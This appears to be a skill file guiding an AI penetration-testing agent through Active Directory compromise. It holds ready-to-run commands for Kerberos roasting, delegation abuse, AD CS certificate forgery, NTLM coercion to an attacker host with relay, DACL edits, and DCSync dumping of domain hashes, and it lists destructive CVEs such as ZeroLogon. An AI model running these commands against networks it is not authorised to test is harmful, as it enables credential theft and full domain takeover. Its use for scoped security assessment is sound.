---
name: active_directory
description: Active Directory / Kerberos domain testing covering roasting, delegation abuse, AD CS (ESC1-ESC17), NTLM coercion+relay, DACL abuse, and credential dumping
---

# Active Directory

Active Directory compromise usually comes from misconfiguration, not memory-corruption bugs: a roastable service account, a delegation flag, a vulnerable certificate template, or an over-permissive ACL turns a single low-priv domain user into Domain Admin. Almost every step needs valid domain credentials (or a foothold to coerce them), and almost every path ends at DCSync or a forged ticket. Test the identity layer — Kerberos, LDAP, NTLM, SMB, AD CS — not the marketing website in front of it.

## Attack Surface

**Core services (per domain controller)**
- Kerberos (88/tcp+udp), LDAP/LDAPS (389/636), Global Catalog (3268/3269)
- SMB (445), RPC/DCE endpoint mapper (135) + high dynamic ports, NetBIOS (137-139)
- DNS (53) — AD-integrated, often allows dynamic updates (ADIDNS)
- WinRM (5985/5986), RDP (3389), MSSQL (1433) on member servers
- AD CS: Certificate Authority + web enrollment (`/certsrv`, `/ADPolicyProvider_CEP_*`, ES/CES)

**Principals & objects**
- Users, computers (`$` accounts), gMSA/sMSA, groups, GPOs, OUs, trusts
- `servicePrincipalName`, `userAccountControl` flags, `msDS-AllowedToDelegateTo`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, `msDS-KeyCredentialLink`
- DACLs on objects (GenericAll/GenericWrite/WriteDacl/WriteOwner/AddSelf)

**Trust boundaries**
- Intra-forest (parent/child), inter-forest, external, SID history
- `MachineAccountQuota` (default 10 → any user can join computer accounts)

## Reconnaissance

**Anonymous / pre-auth (no creds)**
```
# Domain + naming context from LDAP rootDSE
nmap -Pn -p 389 --script ldap-rootdse <DC>
# SMB null session / signing / OS
nmap -Pn -p445 --script "smb-os-discovery,smb2-security-mode" <DC>
enum4linux-ng -A <DC>
# Username-less user enum via Kerberos pre-auth
kerbrute userenum -d <DOMAIN> --dc <DC> users.txt
```

**Authenticated enumeration (any valid user)**
```
nxc ldap <DC> -u <USER> -p <PASS>                       # confirm creds + domain info
nxc smb <SUBNET> -u <USER> -p <PASS> --shares           # readable/writable shares
nxc ldap <DC> -u <USER> -p <PASS> --users --groups --pass-pol
ldapdomaindump ldap://<DC> -u '<DOMAIN>\<USER>' -p <PASS>
```

**BloodHound graph (the single most valuable step)**
```
bloodhound-ce-python -d <DOMAIN> -u <USER> -p <PASS> -c All -ns <DC_IP> --zip
# or, remote SharpHound-equivalent collector:
nxc ldap <DC> -u <USER> -p <PASS> --bloodhound --collection-method All --dns-server <DC_IP>
```
Import into BloodHound (CE) and run the built-in "Shortest paths to Domain Admins" / "Owned principals" queries before touching anything else.

## Key Vulnerabilities

### Kerberos Roasting

**Kerberoasting** — any authenticated user can request a service ticket (RC4/`$krb5tgs$23$`) for any account with an SPN and crack it offline. Human-set service-account passwords are the target; machine accounts are usually uncrackable.
```
nxc ldap <DC> -u <USER> -p <PASS> --kerberoasting kerb.txt
# or impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS> -outputfile kerb.txt
hashcat -m 13100 kerb.txt wordlist.txt
```

**AS-REP Roasting** — accounts with `DONT_REQ_PREAUTH` yield a crackable `$krb5asrep$23$` blob with *no* creds needed if the username is known.
```
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
hashcat -m 18200 asrep.txt wordlist.txt
```

**Targeted Kerberoasting** — with GenericAll/GenericWrite over a user, add an SPN, roast, then remove it.

### Delegation Abuse

- **Unconstrained** (`TRUSTED_FOR_DELEGATION`) — compromise the host, coerce a DC/DA to auth to it (PrinterBug/PetitPotam), capture their TGT from LSA, reuse it. Straight to DCSync.
- **Constrained** (`msDS-AllowedToDelegateTo`) — S4U2Self+S4U2Proxy to impersonate any user to the listed SPN; swap the SPN service class (`cifs`/`host`/`ldap`) for broader access.
- **RBCD** (`msDS-AllowedToActOnBehalfOfOtherIdentity`) — with write access over a computer object + `MachineAccountQuota>0`, create a fake computer, set RBCD, S4U to get an admin ticket for that host.
```
# RBCD chain
addcomputer.py -computer-name FAKE$ -computer-pass P@ss <DOMAIN>/<USER>:<PASS>
rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write <DOMAIN>/<USER>:<PASS>
getST.py -spn cifs/target.<DOMAIN> -impersonate Administrator <DOMAIN>/FAKE$:P@ss
```

### AD Certificate Services (ESC1-ESC17)

AD CS is the highest-yield modern path — one misconfigured template promotes a low-priv user to DA and survives password resets. Enumerate first, everything else follows:
```
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -stdout
```
- **ESC1** — template allows enrollee-supplied SAN + client-auth EKU → request a cert as `administrator`:
  ```
  certipy req -u <USER>@<DOMAIN> -p <PASS> -ca <CA> -template <T> -upn administrator@<DOMAIN>
  certipy auth -pfx administrator.pfx -dc-ip <DC_IP>          # → NT hash / TGT
  ```
- **ESC8** — NTLM relay to the CA web-enrollment endpoint (coerce a DC, relay to `/certsrv`) → DC certificate → DCSync.
- **ESC others** — ESC2/3 (any-purpose/enrollment-agent), ESC4 (writable template DACL → make it ESC1), ESC6 (`EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA), ESC7 (CA officer rights), ESC9/10 (weak cert mapping), ESC11 (RPC relay), ESC13 (issuance-policy→group), ESC15 (app-policy on v1 templates). `certipy find -vulnerable` flags each.

### NTLM Coercion & Relay

Force a privileged machine to authenticate to you, then relay that NTLM auth to a service that doesn't enforce signing/EPA (LDAP, AD CS, SMB).
```
# 1. Start the relay (LDAP → RBCD, or AD CS → cert)
ntlmrelayx.py -t ldap://<DC> --delegate-access --no-dump
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# 2. Coerce a target to authenticate
coercer coerce -u <USER> -p <PASS> -t <TARGET> -l <ATTACKER_IP>
PetitPotam.py -u <USER> -p <PASS> <ATTACKER_IP> <DC>          # MS-EFSR
printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET> <ATTACKER_IP>   # MS-RPRN
```
LLMNR/NBT-NS/mDNS poisoning with Responder captures NetNTLMv2 hashes on the broadcast segment for offline cracking or relay.

### DACL / Object Abuse

From BloodHound edges:
- **GenericAll/GenericWrite** on a user → targeted Kerberoast or Shadow Credentials (`msDS-KeyCredentialLink` via Certipy/pywhisker → PKINIT → NT hash).
- **WriteDacl/WriteOwner** → grant yourself GenericAll, then DCSync rights on the domain object.
- **ForceChangePassword** → reset a target's password.
- **AddMember** on a privileged group → self-add.
- **GPO edit rights** → push an immediate scheduled task / local admin to linked OUs.
```
# Shadow Credentials (no password reset needed, stealthier)
certipy shadow auto -u <USER>@<DOMAIN> -p <PASS> -account <TARGET> -dc-ip <DC_IP>
# bloodyAD for generic DACL edits
bloodyAD -u <USER> -p <PASS> -d <DOMAIN> --host <DC> add genericAll <TARGET_DN> <USER>
```

### Credential Access & Domain Dominance

- **DCSync** (with replication rights — `DS-Replication-Get-Changes*`) dumps any/all hashes incl. `krbtgt`:
  ```
  secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC> -just-dc-user krbtgt
  nxc smb <DC> -u <USER> -p <PASS> --ntds        # full NTDS.dit
  ```
- **Golden ticket** (`krbtgt` hash) / **Silver ticket** (service acct hash) / **Diamond ticket** — forge TGTs/STs for persistence.
- **Pass-the-Hash / OverPass-the-Hash / Pass-the-Ticket** — reuse NT hashes or Kerberos tickets without the plaintext.
- **LAPS / gMSA** — readable `ms-Mcs-AdmPwd` or `msDS-ManagedPassword` grants local admin / service creds.

### Known unauthenticated CVEs (patch-dependent)

- **ZeroLogon** (CVE-2020-1472) — resets the DC machine account to null, instant DA on unpatched DCs.
- **noPac** (CVE-2021-42278/42287) — sAMAccountName spoofing → impersonate DC.
- **PrintNightmare** (CVE-2021-1675/34527), **PetitPotam** (unauth MS-EFSR pre-KB5005413).
Confirm with a version/patch check before firing — these are destructive.

## Advanced Techniques

- **UnPAC-the-hash** — recover a user's NT hash from a PKINIT/cert auth (Certipy `auth` prints it).
- **sAMAccountName spoofing** chain (noPac) when `MachineAccountQuota>0` and DCs unpatched.
- **SID history injection** across trusts for cross-domain/forest escalation.
- **ADIDNS poisoning** — add wildcard/records via authenticated LDAP to intercept name resolution.
- **Timeroast** — roast computer-account passwords via NTP if the DC exposes MS-SNTP.

## Testing Methodology

1. **Foothold check** — Confirm creds work (`nxc ldap/smb`) and note privileges; note `MachineAccountQuota` and password policy.
2. **BloodHound first** — Collect + graph before manual work; mark the foothold principal as owned and read the DA paths.
3. **Low-noise credential harvest** — AS-REP roast (no auth), Kerberoast, readable LAPS/gMSA, GPP passwords in SYSVOL.
4. **AD CS sweep** — `certipy find -vulnerable`; it is often the shortest path and independent of the BloodHound graph.
5. **DACL edges** — Walk each BloodHound edge from owned → high value; prefer Shadow Credentials over password resets (reversible, quieter).
6. **Delegation** — Enumerate unconstrained/constrained/RBCD; chain with coercion where a privileged auth is needed.
7. **Coercion + relay** — Only where signing/EPA is off; identify the relay target (LDAP/AD CS) first.
8. **Prove domain dominance** — DCSync `krbtgt` / a target user, then stop. Do not persist (golden ticket) on client engagements unless in scope.

## Validation

1. Show the exact misconfiguration (SPN, `userAccountControl` flag, template flags, ACE, missing patch) with the enumerating tool's raw output.
2. Demonstrate the privilege gained — a cracked service-account password, an issued certificate authenticating as a privileged user, or an NT hash from DCSync.
3. Provide the full chain: owned principal → edge/misconfig → escalation step → resulting access, with commands and evidence at each hop.
4. Tie the impact to a concrete identity (e.g. "user `svc-sql` → Domain Admins") rather than a generic "AD is misconfigured".
5. For coercion/relay, capture both the coerced authentication and the relayed action succeeding.

## False Positives

- Kerberoastable SPN on a **machine account** — password is 120-char random, effectively uncrackable; not a finding on its own.
- `certipy find` lists a template as ESC-vulnerable but enrollment rights exclude your principal (check the `Enrollment Rights` / `Requires Manager Approval` fields).
- Delegation flags present but the account is disabled or the target SPN is unreachable.
- Relay target enforces SMB/LDAP signing or channel binding (EPA) — the relay will fail; not exploitable.
- DCs fully patched — ZeroLogon/noPac/PetitPotam checks report "not vulnerable".
- "Writable" share that only exposes a redirected/quarantined path with no useful content.

## Impact

- Full domain (and often forest) compromise: read/modify all objects, all credentials, all data.
- Persistent, patch-surviving access via golden tickets, forged certificates, or SID history.
- Lateral movement to every domain-joined host (file servers, databases, hypervisors).
- Ransomware blast radius — DA is the standard pivot for domain-wide deployment.

## Pro Tips

1. BloodHound before brute force — the graph turns hours of guessing into a named path; always mark owned nodes.
2. Prefer AS-REP roasting and `certipy find` early — both are quiet and one needs no creds.
3. Shadow Credentials > password reset when you have write access: reversible, doesn't lock out the account, no plaintext needed.
4. Fix clock skew before Kerberos work: `sudo ntpdate <DC>` (or `faketime`) — `KRB_AP_ERR_SKEW` kills ticket ops.
5. Use FQDNs and set `/etc/resolv.conf` to the DC (or `--dns-server`); Kerberos and LDAP referrals break on bare IPs.
6. `nxc` (NetExec) is the CrackMapExec successor — CME is unmaintained; use `nxc` and its `--gen-relay-list`, `--bloodhound`, `-M` modules.
7. Pair with `nmap` (service/port discovery) and `authentication_jwt` skills where the domain fronts web SSO (ADFS/SAML).

## Tooling

**None of the AD tools below ship in the Strix sandbox by default** (the image is Kali-rolling but installs only web-focused tooling). Install what the task needs — the sandbox has `pipx`, `pip`, `go`, `git`, and Kali's apt repos. AD testing also requires **network reachability to the target DC/subnet**, which the default web-target sandbox usually lacks; confirm connectivity first.

```
# Python identity toolkit (impacket = GetUserSPNs/GetNPUsers/secretsdump/ntlmrelayx/getST/addcomputer/rbcd)
pipx install impacket
pipx install netexec            # nxc — CME successor: ldap/smb/winrm enum, roasting, bloodhound, ntds
pipx install certipy-ad         # AD CS enum + ESC1-ESC17 abuse, shadow credentials
pipx install bloodhound-ce      # bloodhound-ce-python collector (BloodHound CE ingestor)
pipx install coercer            # multi-protocol coercion (MS-EFSR/RPRN/DFSNM/FSRVP)
pipx install bloodyAD           # DACL / LDAP object edits over LDAP
pipx install ldapdomaindump     # LDAP dumper (bloodhound.py author)
go install github.com/ropnop/kerbrute@latest   # kerbrute (Go) — user enum / pre-auth brute

# Kali apt packages
sudo apt-get install -y smbclient ldap-utils krb5-user enum4linux-ng responder hashcat john
```

- **NetExec (`nxc`)** — swiss-army enum/exec across smb/ldap/winrm/mssql; use for creds validation, share hunting, `--kerberoasting`, `--bloodhound`, `--ntds`.
- **impacket** — the canonical scriptable attack primitives (roasting, S4U, relay, secretsdump, ticket forging).
- **Certipy** — AD CS: `find -vulnerable`, `req`, `auth`, `shadow`, relay; covers the full ESC1-ESC17 set.
- **BloodHound CE + collector** — attack-path graphing; the first thing to run with any valid credential.
- **Responder / ntlmrelayx / Coercer / PetitPotam** — the poisoning→coercion→relay chain (needs L2 access or a coercible target).
- **hashcat / john** — offline cracking of roasted `$krb5tgs$`/`$krb5asrep$` blobs (modes `13100` / `18200`).

Humans often use GUI BloodHound and Windows-side C# tooling (SharpHound, Rubeus, Certify, PowerView); in-sandbox prefer the Python/Linux equivalents above (`bloodhound-ce-python`, impacket, Certipy, `nxc`).

## Summary

AD compromise is a graph problem: start from a valid credential, map paths with BloodHound, and chain misconfigurations — roastable accounts, delegation flags, vulnerable certificate templates, coercion+relay, and permissive DACLs — until you reach DCSync or a forged ticket. The identity plane (Kerberos/LDAP/NTLM/SMB/AD CS), not the perimeter, is where domains fall.
